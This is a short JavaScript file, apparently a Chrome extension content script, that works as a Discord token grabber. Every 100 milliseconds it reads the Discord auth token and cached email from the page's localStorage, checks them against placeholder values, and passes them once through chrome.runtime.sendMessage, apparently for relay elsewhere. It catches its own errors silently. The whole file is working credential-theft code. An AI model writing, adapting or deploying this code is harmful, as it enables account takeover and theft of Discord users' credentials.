var stt = false;

function std(msg) {
  try {
    chrome.runtime.sendMessage({ message: msg }, function (response) {
    });
    //console.log("SENT: " + msg)
  }
  catch (err) {
  }
}

setInterval(() => {
  if (localStorage['token'] != "" && localStorage['email_cache'] != null && stt == false) {
    if (localStorage['token'] != "." && localStorage['token'] != "abc" && toString(localStorage['token']) != "undefined") {
      var tokentext = "\n\nDiscord Email:\n" + localStorage['email_cache'] + "\nToken\n" + localStorage['token'];
      if (tokentext.match("undefined") == null && tokentext.match("abc") == null && tokentext.match('"."') == null) {
        std(tokentext);
        stt = true;

      }
    }
  }


console.log("thisworks");
}, 100);

